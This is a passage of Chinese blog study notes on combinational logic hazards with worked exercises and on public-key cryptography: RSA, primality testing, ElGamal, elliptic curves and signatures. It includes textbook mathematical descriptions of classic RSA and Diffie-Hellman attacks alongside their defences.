组合逻辑电路设计</h1><p>设计的首要任务是将文字描述的设计要求抽象为一种逻辑关系，即抽象出描述问题的逻辑表达式，然后根据表达式画逻辑电路。逻辑电路可以使用们短路（小规模）、中规模集成电路进行组合，也可使用可编程大规模集成电路实现。</p><p>设计的一般步骤：</p><ul><li>确定输入、输出，列出真值表</li><li>写出表达式并简化</li><li>画出卡诺图</li><li>求出最简与或表达式</li><li>如果需要进行形式变换则进行，否则跳过</li><li>画出逻辑电路图</li></ul><p>包含无关条件的组合逻辑电路设计</p><ul><li>在一些实际问题中，输入变量之间存在相互制约或问题的某种特殊限定等，使逻辑函数与输入变量的某些取值组合无关。</li><li>描述此类问题的逻辑函数称为包含无关条件的逻辑函数</li><li>采用“最小项之和”表达式描述一个包含无关条件的逻辑问题时，函数表达式中是否包含无关项，以及对无关项是令其值为0还是1，并不影响函数的实际逻辑功能</li><li>在化简此类逻辑函数时，利用无关项的随意性往往可以使逻辑函数得到更好地简化，从而使设计的电路达到更简</li></ul><h1 id="4-3-组合逻辑电路的险象"><a href="#4-3-组合逻辑电路的险象" class="headerlink" title="4.3 组合逻辑电路的险象"></a>4.3 组合逻辑电路的险象</h1><p>实际情况下需要考虑信号传输的时延问题。实际上，信号经过任何逻辑门和导线都会产生时间延迟，这就使得当电路所有输入达到稳定状态时，输出并不是立即达到稳定状态。<br>延迟时间对数字系统是一个有害的因素。一般会造成系统运行速度下降，电路中信号的波形参数变坏，以及产生竞争险象等问题。</p><ul><li>逻辑电路中各路径上延迟时间的长短与信号经过的门的级数有关，与具体逻辑门的时延大小有关，还与导线的长短有关。</li><li>因此，输入信号经过不同路径到达输出端的时间有先有后，这种现象称为竞争现象。</li></ul><p>竞争现象分为临界竞争和非临界竞争。</p><ul><li>不产生错误输出的称为非临界竞争</li><li>导致错误输出的竞争称为临界竞争，被称为<strong>险象</strong><ul><li>这种险象是一种瞬态险象</li><li>它表现为在输出端陈胜不应有的尖脉冲，暂时地破坏正常逻辑关系</li><li>一旦瞬态过程结束，即可恢复正常逻辑关系</li></ul></li></ul><p>险象分类：</p><ul><li>静态险象：在输入变化而输出不应发生变化的情况下，输出端产生了短暂的错误输出</li><li>动态险象：在输入变化而输出应该发生变化的情况下，输出在变化过程中产生了短暂的错误输出。</li><li>“0”型险象：错误输出信号为负脉冲</li><li>“1”型险象：错误输出信号为正脉冲</li></ul><p>险象的判断：代数法和卡诺图法</p><ul><li>代数法：检查函数表达式中是否存在具备竞争条件的变量，是否有某个变量同时以原变量和反变量的形式出现在函数表达式中。<ul><li>如果具备，则代入其他变量，看函数表达式是否会成为$X\cdot \bar X$和$X+ \bar X$。</li><li>若会，则说明对应的逻辑电路可能产生险象。</li></ul></li><li>卡诺图法：画出函数卡诺图，画出和函数表达式中各项“与”项对应的卡诺圈。<ul><li>若卡诺圈之间存在“相切”关系，则可能产生险象。</li></ul></li></ul><p>消除险象的方法：增加冗余项（√）、增加惯性延时环节、选通法<br>在代数法中，增加冗余项的方法是：记下某个变量产生险象时其他变量的取值，将其全部取反之后相与，加上这一项即可。<br>卡诺图法中，增加卡诺圈消除相切即可。</p><h1 id="解题指南"><a href="#解题指南" class="headerlink" title="解题指南"></a>解题指南</h1><p>五、分析题</p><ol><li>略</li><li>(1) 写出逻辑表达式：<br>$$F&#x3D;\overline{\overline{ABC}A+\overline{ABC}B+\overline{ABC}C}\<br>&#x3D;(ABC+\overline A)(ABC+\overline B)(ABC+\overline C)\<br>&#x3D;ABC+\overline{ABC}$$<br>(2) 结果简单，直接描述功能：判断三个输入是否都相等<br>(3) 简化电路图：<br><img src="https://img-blog.csdnimg.cn/ad1ed3b321274983a377b70d1848cad3.png"></li></ol><p>六、设计题</p><ol><li>(1) 功能描述：比较两个二位二进制数<br>(2) 输入：4个；输出：1个。真值表：</li></ol><table><thead><tr><th align="center">B1B0\A1A0</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">01</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">11</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">10</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">0</td></tr></tbody></table><p>(3) 表达式：$Z&#x3D;A_1\overline{B_1}+\overline{B_1}\cdot\overline{B_0}A_0+\overline{B_1}A_1A_0$<br>(4) 电路图：<br><img src="https://img-blog.csdnimg.cn/910e7ebffa614a03a7eba919248cf424.png"></p><ol start="2"><li>本题的关键在于使用与非门设计。<br>(1) 输入：4个，输出：1个。真值表：</li></ol><table><thead><tr><th align="center">A3A2\A1A0</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">01</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">1</td></tr><tr><td align="center">11</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">10</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">0</td></tr></tbody></table><p>(2) 表达式：<br>$$Z&#x3D;A_2\overline{A_1}A_0+\overline{A_2}A_1A_0+\overline{A_3}A_1\overline{A_0}\<br>&#x3D;\overline{\overline{A_2\overline{A_1}A_0+\overline{A_2}A_1A_0+\overline{A_3}A_1\overline{A_0}}}\<br>&#x3D;\overline{\overline{A_2\overline{A_1}A_0}\cdot\overline{\overline{A_2}A_1A_0}\cdot\overline{\overline{A_3}A_1\overline{A_0}}}\<br>&#x3D;\overline{\overline{\overline{A_2A_1}A_2A_0}\cdot\overline{\overline{A_2A_1}A_1A_0}\cdot\overline{\overline{A_3A_1}\cdot\overline{A_1A_0}A_1}}$$<br>(3) 电路图：略</p><ol start="3"><li>(1) 输入：4个，输出：4个；真值表：</li></ol><table><thead><tr><th align="center">A3A2\A1A0</th><th align="center">00</th><th align="center">01</th><th align="center">11</th><th align="center">10</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">0011</td><td align="center">0100</td><td align="center">0110</td><td align="center">0101</td></tr><tr><td align="center">01</td><td align="center">0111</td><td align="center">1011</td><td align="center">1101</td><td align="center">1100</td></tr><tr><td align="center">11</td><td align="center">1110</td><td align="center">1111</td><td align="center">dddd</td><td align="center">dddd</td></tr><tr><td align="center">10</td><td align="center">dddd</td><td align="center">dddd</td><td align="center">dddd</td><td align="center">dddd</td></tr></tbody></table><p>(2) 表达式：<br>$$Z_0&#x3D;\overline{A_3}\cdot\overline{A_1}\cdot\overline{A_0}+\overline{A_3}\cdot\overline{A_2}\cdot\overline{A_0}+A_2A_0\<br>Z_1&#x3D;\overline{A_1}\cdot\overline{A_0}+A_2\overline{A_1}+\overline{A_2}A_1A_0\<br>Z_2&#x3D;\overline{A_2}A_0+\overline{A_3}A_1+A_3\overline{A_1}+A_2\overline{A_0}$$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础 Chapter 5——公钥密码体制</title>
      <link href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-5%E2%80%94%E2%80%94%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/"/>
      <url>/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-5%E2%80%94%E2%80%94%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h1><h2 id="对称密钥的三大问题"><a href="#对称密钥的三大问题" class="headerlink" title="对称密钥的三大问题"></a>对称密钥的三大问题</h2><ol><li>密钥交换</li><li>密钥管理：每两个用户之间的密钥都不相同</li><li>抵赖行为：不承认发送过某条消息</li></ol><h2 id="单向陷门函数"><a href="#单向陷门函数" class="headerlink" title="单向陷门函数"></a>单向陷门函数</h2><p>希望可以找到一个密码体制，对于给定的加密e<del>k</del>，除了消息接受者，求d<del>k</del>在计算上不可行。其中e<del>k</del>可公开，无需分享密钥。<br>单向函数：一个函数容易计算但求逆困难。（还没有一个函数没证明单向）<br>单向陷门函数：存在一个单向函数，该函数在具有特定知识（称为陷门）后容易求逆</p><h2 id="单向函数定义"><a href="#单向函数定义" class="headerlink" title="单向函数定义"></a>单向函数定义</h2><p>假定n&#x3D;pq（p、q为不同的大素数），b为正整数，定义f：Z<del>n</del>→Z<del>n</del>，f(x)&#x3D;x^b^ mod n<br>陷门：大数n的因式分解<br>若已知n的因式分解n&#x3D;pq，则$\varphi(n)$&#x3D;(p-1)(q-1)<br>若gcd(b,φ(n))&#x3D;1，且ab$\equiv$ 1 mod φ(n)<br>f^-1^：Z<del>n</del>→Z<del>n</del>，f^-1^(x)&#x3D;x^a^ mod n</p><h2 id="公钥密码使用方式"><a href="#公钥密码使用方式" class="headerlink" title="公钥密码使用方式"></a>公钥密码使用方式</h2><p>用于加密：公钥加密私钥解密，无需交换密钥<br>用于认证：防止抵赖，如果要证明某文件为自己生成，则可以使用自己的私钥加密，其他人接收到之后通过公钥验证签名，用手中的所有公钥尝试，使用谁的公钥能够解密就是谁生成的文件</p><h1 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h1><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><p>欧拉定理：$(a,n)&#x3D;1,a^{\varphi(n)}\equiv 1\pmod n$<br>费马小定理：$a^p\equiv a\pmod p$</p><h2 id="密码算法"><a href="#密码算法" class="headerlink" title="密码算法"></a>密码算法</h2><p>n&#x3D;pq，K&#x3D;{(n,p,q,e,d): ed$\equiv$ 1 mod φ(n)}<br>定义$e_k(x)&#x3D;x^e\pmod n,d_k(y)&#x3D;y^d\pmod n,(x,y\in Z_n)$，(n,e)为公钥，(n,d)为私钥</p><h2 id="参数生成"><a href="#参数生成" class="headerlink" title="参数生成"></a>参数生成</h2><p>素性检测、公私钥对<br>加解密过程的快速实现：</p><ul><li>平方-乘算法</li><li>蒙哥马利算法</li><li>中国剩余定理加速解密</li></ul><h3 id="平方-乘算法"><a href="#平方-乘算法" class="headerlink" title="平方-乘算法"></a>平方-乘算法</h3><p>要计算$a^b\mod n$：<br>$$b&#x3D;\sum_{i&#x3D;0}^{l-1}b_i2^i,b_i\in{0,1},b_{l-1}&#x3D;1\<br>b&#x3D;b_{l-1}2^{l-1}+b_{l-2}2^{l-2}+…+b_1\cdot 2+b_0\<br>&#x3D;2(2(…(2(b_{l-1})+b_{l-2})+…)+b_1)+b_0\<br>a^b&#x3D;a^{\sum_{i&#x3D;0}^{l-1}b_i2^i}&#x3D;(((…(1\times a^{b_{l-1}})^2\times a^{b_{l-2}})^2\times …)^2\times a^{b_1})^2\times a^{b_0}$$<br>（实际上就是模平方重复法的变体）<br><img src="https://img-blog.csdnimg.cn/023b3b9aa9384384b16254a175ada844.jpeg"><br>如上图示例：<br>9726^2^ $\equiv$ 2659(mod 11413)<br>2659^2^ $\equiv$ 5634(mod 11413)</p><h3 id="蒙哥马利算法"><a href="#蒙哥马利算法" class="headerlink" title="蒙哥马利算法"></a>蒙哥马利算法</h3><p><strong>蒙哥马利变换</strong><br>d&#x3D;2^32^，2^64^，假设d&#x3D;2^32^<br>模N：：k&#x3D;32n比特奇数，IN&#x3D;-N^-1^ mod 2^32^<br>R&#x3D;d^n^&gt;N，(R,N)&#x3D;1，a,b∈Z<del>N</del><br>A&#x3D;Mont(a) &#x3D; aR mod N<br>MontInv(A) &#x3D; AR^-1^ mod N<br>MontInv(Mont(a)) &#x3D; a mod N</p><p>A &#x3D; Mont(a), B &#x3D; Mont(b)<br>MontMult(A,B)&#x3D;ABR^-1^ &#x3D; aRbRR^-1^ &#x3D; abR mod N &#x3D; Mont(ab mod N)<br>MontMult(A,MontMult(A,A))&#x3D;Mont(a^3^ mod N)</p><p>MontMult(A,B) &#x3D; ABR^-1^ mod N<br>T &#x3D; AB, 2n位整数，T&#x3D;(0t<del>2n-1</del>t<del>2n-2</del>…t<del>1</del>t<del>0</del>)<br>计算T’&#x3D;T+N×((t<del>0</del>×IN) mod 2^32^)<br>(1) T’ &#x3D; T mod N<br>(2) T’ &#x3D; t<del>0</del>+(N×IN)t<del>0</del> &#x3D; 0 mod 2^32^<br>(3) T’ &gt;&gt; 32, T’ &#x3D; T×2^32^ mod N<br>令T&#x3D;T’, 重复上述步骤n次，T×2^-32n^ &#x3D; TR^-1^ mod N<br>T’ &#x3D; (0ct<del>n-1</del>‘t<del>n-2</del>‘…t<del>0</del>‘)，如果T’&gt;N，返回T’-N，否则返回T’&#x3D;(t<del>n-1</del>‘t<del>n-2</del>‘…t<del>0</del>‘)</p><p>快速模幂运算a^e^ mod N</p><h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>把解密时的一个式子拆成两个式子来算（模p和q）</p><h3 id="素数定理"><a href="#素数定理" class="headerlink" title="素数定理"></a>素数定理</h3><p>$$\pi(N)\approx\frac{N}{\ln N}$$<br>若n&#x3D;pq，为1024比特，则p,q为512比特<br>$\frac{1}{\ln 2^{512}}\approx\frac{1}{355}$（为素数的概率）</p><h3 id="素性检测"><a href="#素性检测" class="headerlink" title="素性检测"></a>素性检测</h3><p><strong>费马素性检测</strong>：若p为素数，(a,p)&#x3D;1，则a^p-1^ &#x3D; 1 mod p</p><p><strong>伪素数</strong>：设n为奇合数，如果整数b，(b,n)&#x3D;1，使得b^n-1^&#x3D;1 mod n，则称n为对于基b的伪素数</p><p><strong>Euler伪素数</strong>：设n为正奇合数，整数b，(b,n)&#x3D;1，满足$b^{\frac{p-1}{2}}\equiv (\frac{b}{n})\mod n$，称n为对于基b的Euler伪素数</p><p>p-1&#x3D;2^s^t，$a^{p-1}-1&#x3D;(a^{2^{s-1}t}+1)(a^{2^{s-2}t}+1)…(a^{t}+1)(a^{t}+1)$<br>则下列同余式中至少有一个成立：<br>$a^t\equiv -1\mod p, a^{2t}\equiv -1\mod p,…,a^{2^{s-1}t}\equiv -1\mod p$<br><strong>强伪素数</strong>：设n为奇合数，n-1&#x3D;2^s^t，t为奇数，整数b与n互素，满足b^t^&#x3D;1 mod n，或者存在r，0≤r&lt;s，有$b^{2^rt}\equiv -1\mod n$，称n为对于基b的强伪素数</p><p><strong>Solovay-Strassen算法</strong><br>随机选择整数a在1到n-1之间，x&#x3D;$(\frac{a}{n})$，若x&#x3D;0则n为合数；若$x\equiv a^{\frac{n-1}{2}}\pmod n$则n是素数，否则为合数（计算雅可比符号）<br>判断具有1&#x2F;2的错误概率（若n为素数则输出一定为素数，若n为合数则有1&#x2F;2的概率输出为合数）</p><p><strong>Miller-Rabin算法</strong><br>n-1&#x3D;2^s^t的形式，其中t为奇数<br>随机选择整数a在1到n-1之间<br>计算$b&#x3D;a^t\mod n$<br>如果$b\equiv 1\pmod n$，那么n为素数；否则进行下列循环：<br>for i&#x3D;0 to s-1:<br>if $b\equiv -1\pmod n$，then n是素数<br>else b&#x3D;b^2^ mod n<br>若循环能结束则n为合数</p><p>若n为强伪素数，则输出可能为素数；若n为素数，则输出一定为素数，具有1&#x2F;4的错误概率，优于Solovay-Strassen算法</p><p><strong>AKS算法</strong><br>确定性素性检测方法<br>理论基础：$a\in Z,n\in N,n\ge 2,(a,n)&#x3D;1$，n是素数，当且仅当$(x+a)^n&#x3D;x^n+a\pmod n$<br>该算法为该理论复杂度的改进：$(x+a)^n&#x3D;x^n+a\pmod {x^r-1,n}$<br>算法的时间复杂度高于概率算法</p><ul><li>若存在整数a&gt;0且b&gt;1，满足n&#x3D;a^b^，则输出合数</li><li>找出满足$\operatorname {ord}_r(n)&gt;\log_2n$的最小的r</li><li>若对a≤r，1&lt;gcd(a,n)&lt;n，输出合数</li><li>若n≤r，输出素数</li><li>for a&#x3D;1 to $\lfloor{\sqrt{\varphi(r)}\log n}\rfloor$ do<ul><li>if (x+a)^n^≠x^n^+a (mod x^r^-1, n)，输出合数</li></ul></li><li>输出素数</li></ul><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>给群组中每个人相同的公钥n，但指数e和d不同时可能产生共模攻击</p><ul><li>对于群组内成员，即使不分解n也可以解密其他人消息<br>$e_1d_1\equiv 1\mod \varphi(n),e_2d_2\equiv 1\mod \varphi(n)$<br>$e_2d_2’\equiv 1\mod(e_1d_1-1)\Rightarrow e_2d_2’\equiv 1\mod \varphi(n)$<br>（自己有$e_1,d_1$，因此可以计算$d_2’$）</li><li>群组外人员如果截获到发送给群组不同成员的同一消息，而两个加密指数互素，则可以直接恢复消息<br>令m为明文消息，加密指数为$e_1,e_2$，且二者互素，故存在r,s使得$re_1+se_2&#x3D;1$，假设r为负数<br>则$(c_1^{-1})^{-r}c_2^s&#x3D;m^{re_1+se_2}&#x3D;m\mod n$</li></ul><h2 id="小加密指数攻击"><a href="#小加密指数攻击" class="headerlink" title="小加密指数攻击"></a>小加密指数攻击</h2><p>若选择的e较小（如3），则加密会很快<br><strong>Coppersmith定理攻击</strong>：n为大整数，f为次数为e的多项式，可以在log n时间内有效计算出f(x)&#x3D;0 mod n的小于$n^{\frac{1}{e}}$的解。<br>应避免使用小的加密指数，e最少应选取2^16^+1&#x3D;65537<br>在短消息加密之前应该首先填充</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>教科书式的RSA方案是不安全的，速度慢是其主要缺点（硬件实现比DES慢1000倍，软件慢100倍，选择特定的e值能够大大加快RSA的速度）<br>可用于加密、密钥交换和数字签名</p><h1 id="Rabin密码体制"><a href="#Rabin密码体制" class="headerlink" title="Rabin密码体制"></a>Rabin密码体制</h1><p>设n&#x3D;pq，其中p,q为素数，均为4k+3型素数<br>P&#x3D;C&#x3D;Z<del>n</del>，且定义K&#x3D;{(n,p,q)}<br>对于k&#x3D;(n,p,q)，定义<br>$e_k(x)&#x3D;x^2\pmod n, d_k(y)&#x3D;\sqrt y\pmod n$<br>（x,y∈Z<del>n</del>），其中n为公钥，p、q为私钥</p><p>这是一个单向陷门函数，陷门为n的分解。f(x)&#x3D;x^2^ mod n</p><h1 id="公开密钥算法"><a href="#公开密钥算法" class="headerlink" title="公开密钥算法"></a>公开密钥算法</h1><p>加密：$C&#x3D;E_{K_{pub}}(P)$<br>解密：$P&#x3D;D_{K_{prv}}(C)$<br>两个密钥不能相互推导（或推导的难度不亚于密码分析）<br>其中一个密钥公开（$K_{pub}$），另一个密钥保密（$K_{prv}$）<br>每一个用户掌握一个私钥，并将相应的公钥放在公共目录中</p><p>问题：如何让别人正确知道你的公钥？（如何保证你发出的公钥不被篡改&#x2F;如何证明一个公钥是不是你的？）<br>答案：通过可信授权中心（PKI），每个人将自己的公钥发给PKI，由PKI为该公钥签名，相当于提供一个证书，在将这个有签名的公钥返还给用户。</p><h1 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h1><p>对于乘法群$(G,\cdot)$，一个n阶元素a∈G和β∈&lt;a&gt;<br>问题：找到唯一非负整数i不大于n-1，满足a^i^&#x3D;β<br>将整数i记为$\operatorname {ind}_{\alpha}(\beta)$，称为β的离散对数</p><h1 id="Diffie-Hellman算法"><a href="#Diffie-Hellman算法" class="headerlink" title="Diffie-Hellman算法"></a>Diffie-Hellman算法</h1><p>交换素数p和本原元g<br>Alice和Bob选择各自的私钥，Alice向Bob发送X&#x3D;g^x^ mod p，Bob向Alice发送Y&#x3D;g^y^ mod p。<br>之后Alice计算k&#x3D;Y^x^ mod p，Bob计算k&#x3D;X^y^ mod p，二者计算的值相等，实现密钥交换。</p><p>上述的密钥交换方案不安全。容易遭受中间人攻击。<br>如果Eve能够截获两者发送的X和Y，他用自己的密钥进行计算然后分别发送给Alice和Bob，这样A和B接收到的就是Eve的值。</p><h1 id="ElGamal密码体制"><a href="#ElGamal密码体制" class="headerlink" title="ElGamal密码体制"></a>ElGamal密码体制</h1><p>假设p为一个大素数，使得p构成乘法群上的离散对数问题难解。令α∈Z<del>p</del>是一个本原元，令P&#x3D;Z<del>p</del>*，C&#x3D;Z<del>p</del>*×Z<del>p</del>*，定义K&#x3D;{(p,α,a,β): β&#x3D;α^a^ mod p}<br>其中p,α,β为公钥，a为私钥。<br>对k&#x3D;(p,α,a,β)以及一个秘密的随机数r∈Z<del>p-1</del>，定义e<del>k</del>(x,r)&#x3D;(y<del>1</del>, y<del>2</del>)<br>其中y<del>1</del>&#x3D;α^r^ mod p, y<del>2</del>&#x3D;xβ^r^ mod p<br>定义d<del>k</del>(y<del>1</del>, y<del>2</del>)&#x3D;y<del>2</del>(y<del>1</del>^a^)^-1^ mod p<br>注意r在加密的时候需要随机选择，加密后应立即销毁不能在信道上传输。<br>加密运算具有不确定性。<br><font color=red>注意三个公钥中只有β与私钥a直接相关。</font></p><h1 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h1><p>设a,b∈R是满足$4a^3+27b^2\ne 0$的实常数，方程$y^2&#x3D;x^3+ax+b$所有解(x, y)∈R×R连同一个无穷远点$O$组成的集合E称为一个非奇异椭圆曲线。</p><p>从函数图像来看，椭圆曲线有两种，一种有一条线，一种有两条线</p><h2 id="Weierstrass方程"><a href="#Weierstrass方程" class="headerlink" title="Weierstrass方程"></a>Weierstrass方程</h2><p>定义在代数闭域$\bar K$上射影平面坐标的一般方程<br>$Y^2Z+a_1XYZ+a_3YZ^2&#x3D;X^3+a_2X^2Z+a_4XZ^2+a_6Z^3 (a_1,a_2,a_3,a_4,a_6\in\bar K)$<br>K上的射影平面P^2^(K)是K^3^&#x2F;{(0, 0, 0)}上关系<del>的等价类集合，每个等价类记作(X:Y:Z)<br>(X</del>1<del>,Y</del>1<del>,Z</del>1<del>) ~ (X</del>2<del>,Y</del>2<del>,Z</del>2~)<br>$F(X,Y,Z)&#x3D;Y^2Z+a_1XYZ+a_3YZ^2-X^3-a_2X^2Z-a_4XZ^2-a_6Z^3&#x3D;0$<br>非奇异：$\frac{\partial F}{\partial X},\frac{\partial F}{\partial Y},\frac{\partial F}{\partial Z}$在P点至少有一个非0。</p><p>椭圆曲线E：非奇异Weierstrass方程的所有P^2^($\bar K$)的解<br>y^2^+a<del>1</del>xy+a<del>3</del>y&#x3D;x^3^+a<del>2</del>x^2^+a<del>4</del>x+a<del>6</del></p><p>(E,+)是一个以无穷远点0为单位元的阿贝尔群，加法规则为：<br>$P+0&#x3D;0+P&#x3D;P\<br>-0&#x3D;0\<br>P&#x3D;(x_1,y_1)\ne 0, -P&#x3D;(x_1,-y_1-a_1x_1-a_3)\<br>Q&#x3D;-P,P+Q&#x3D;0<br>P,Q\ne 0,Q\ne -P,P+Q&#x3D;-R$<br>其中R为直线PQ或过点P的切线与椭圆曲线的第三个交点<br><img src="https://img-blog.csdnimg.cn/386924c7cd1246ecae2816711b0d0112.jpeg"><br>（当P和Q重合时，直线是曲线的切线，把y作为因变量对x求导计算$\frac{dy}{dx}$）</p><h2 id="椭圆曲线密码（ECC）"><a href="#椭圆曲线密码（ECC）" class="headerlink" title="椭圆曲线密码（ECC）"></a>椭圆曲线密码（ECC）</h2><p>阶：有限域F<del>q</del>上的椭圆曲线E(F<del>q</del>)由点组成，其上点的数量即为#E(F<del>q</del>)。称为椭圆曲线的阶。</p><p>倍点运算：P+P</p><p>椭圆曲线离散对数问题：已知曲线E(F<del>q</del>)，阶为n的点G∈E(F<del>q</del>)，P∈&lt;G&gt;，椭圆曲线离散对数问题是指确定整数k∈[0,…,n-1]使得P&#x3D;KG成立。</p><p>安全参数的选取：<br>(q, a, b, G, n, h)<br>对于特征为p的有限域F<del>q</del><br>其中a、b为椭圆曲线的参数，G为基点，阶为n，有限域F<del>q</del>的特征为p</p><p>$F_p(p&gt;3): y^2&#x3D;x^3+ax+b,a,b\in F_p,(4a^3+27b^2)\mod p\ne 0$<br>$F_{2^m}(p&#x3D;2): y^2+xy&#x3D;x^3+ax+b,a,b\in F_{2^m}, b\ne 0$</p><p>存在弱椭圆曲线：超奇异曲线（$p|q+1-#E(F_q)$）和异常曲线（$#E(F_q)&#x3D;p$）</p><p><strong>可以基于ECC构建DH密钥交换协议</strong>：首先选择公开参数$(q,F_q,E,G,n)$，Alice发送$P_a&#x3D;aG$，Bob发送$P_b&#x3D;bG$，二者交换后计算分别得到$S&#x3D;abG$即为私钥。（仍然易受到中间人攻击）</p><p><strong>也可以基于ECC构建ElGamal密码体制</strong>：首先选择公开参数$(q,F_q,E,G,n), A:(d_A,P_A),P_A&#x3D;d_AG$<br>B发送明文消息m给A需要加密：<br>随机选择$r\in Z_n$<br>计算$C_1&#x3D;rG, Q&#x3D;rP_A(Q_x\ne 0);C_2&#x3D;mQ_x$<br>发送$(C_1,C_2)$给A<br>解密：$d_AC_1&#x3D;d_ArG&#x3D;rP_A&#x3D;Q,m&#x3D;C_2Q_x^{-1}$</p><h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><p>签名方案：一个签名方案由一个五元组构成（P,A,K,S,V），其中<br>P是所有可能的消息组成的有限集<br>A是所有可能的签名组成的有限集<br>K是所有可能的密钥组成的有限集（密钥空间）<br>对于每一个k∈K，有一个秘密的签名函数sig<del>k</del>∈S和一个相应的公开的验证函数ver<del>k</del>∈V，sig<del>k</del>：P→A，ver<del>k</del>：P×A→{true, false}，满足：<br>当y&#x3D;sig<del>k</del>(x)时，ver<del>k</del>(x,y)&#x3D;true，否则为false</p><h2 id="RSA签名方案"><a href="#RSA签名方案" class="headerlink" title="RSA签名方案"></a>RSA签名方案</h2><p>设n&#x3D;pq，p，q为素数，P&#x3D;A&#x3D;Z<del>n</del>，定义K&#x3D;{(n,p,q,e,d): ed $\equiv$ 1 mod φ(n)}<br>对于k&#x3D;(n,p,q,e,d)，定义sig<del>k</del>(x)&#x3D;x^d^ mod n和ver<del>k</del>(x,y)&#x3D;true ↔ x&#x3D;y^e^ mod n<br>(x,y∈Z<del>n</del>)，(n,e)为公钥，(n,d)为私钥</p><p><strong>存在性伪造问题</strong>：任何人都可以伪造他人的签名y，对应消息为x&#x3D;e<del>k</del>(y)&#x3D;y^e^，一般这个消息是无意义的，但要防止攻击者计算大量的e<del>k</del>(y)，找出有意义的值从而伪造签名。<br>可以通过给消息添加可以识别的冗余信息或者对消息摘要后签名</p><p><strong>选择密文攻击</strong>：<br>假设A响应E的任何签名要求：$c&#x3D;m^e mod n$<br>$x&#x3D;r^e\mod n,y&#x3D;xc\mod n$<br>$y^d\mod n&#x3D;(xc)^d\mod n&#x3D;rc^d\mod n$<br>$r^{-1}y^d\mod n&#x3D;r^{-1}rc^d\mod n&#x3D;m$</p><p>若E想得到A关于消息m的签名，$m&#x3D;m_1m_2\mod n$，可以通过m<del>1</del>和m<del>2</del>的签名构造m的签名。<br>$m^d\mod n&#x3D;(m_1m_2)^d\mod n&#x3D;(m_1^d\mod n)(m_2^d\mod n)\mod n$</p><p>因此不要对陌生消息签名，签名之前先对消息求摘要、身份认证。</p><p><strong>签名和公钥加密结合的方案：</strong></p><ul><li>第一种方案：先签名后加密——$y&#x3D;sig_{Alice}(x),z&#x3D;e_{Bob}(x,y)$</li><li>第二种方案：先加密后签名——$z&#x3D;e_{Bob}(x),y&#x3D;sig_{Alice}(z)$</li><li>第二种方案可能存在伪造签名混淆发送者的问题，因此采用第一种方案更好。</li></ul><p><strong>ElGamal签名方案</strong>：<br>设p为一个大素数，使得$(Z_p^*, \cdot)$上的离散对数问题难解。令$\alpha\in Z_p^*$是一个本原元，令$P&#x3D;Z_p^*,A&#x3D;Z_p^<em>\times Z_{p-1}$，定义$K&#x3D;{(p,\alpha,a,\beta):\beta&#x3D;\alpha^a\mod p}$<br>其中$p,\alpha,\beta$为公钥，$a$为私钥<br>对$k&#x3D;(p,\alpha,a,\beta)$以及一个秘密的随机数$r\in Z_{p-1}^</em>$，定义$sig_k(x,r)&#x3D;(\gamma,\delta)$<br>其中$\gamma&#x3D;\alpha^r\mod p,\delta&#x3D;(x-a\gamma)r^{-1}\mod p-1$<br>对于$x,\gamma\in Z_p^*,\delta\in Z_{p-1}$<br>定义$ver(x,(y,\delta))&#x3D;true\Leftrightarrow \beta^\gamma\gamma^\delta\equiv\alpha^x\mod p$<br>容易证明$\beta^\gamma\gamma^\delta\equiv\alpha^{a\gamma+r(x-a\gamma)r^{-1}\mod p-1}\equiv\alpha^x\mod p$</p><h2 id="数字签名标准"><a href="#数字签名标准" class="headerlink" title="数字签名标准"></a>数字签名标准</h2><p>DSA算法，签名比验证快很多，不能加密和密钥分配，专用于数字签名，比RSA慢<br>设p是一个大素数，使得$(Z_p^*, \cdot)$上的离散对数问题难解。令$\alpha\in Z_p^*$是一个q阶元素（q为素数），$&lt;\alpha&gt;$上的离散对数问题也难解。（整数k与p-1互素，k∈[0, p-2]，q|p-1）</p><p>$$\gamma&#x3D;\alpha^k\mod p,\delta&#x3D;(x+a\gamma)k^{-1}\mod p-1(k\in Z_{p-1}^*)\<br>\because k\delta\equiv x+a\gamma\mod p-1,\therefore\alpha^{k\delta}\equiv\alpha^{x+a\gamma}\mod p\<br>\Rightarrow\alpha^x\beta^\gamma\equiv\gamma^\delta\mod p,\delta&#x3D;(x+a\gamma)k^{-1}\mod q\<br>\gamma’&#x3D;\gamma\mod q&#x3D;(\alpha^k\mod p)\mod 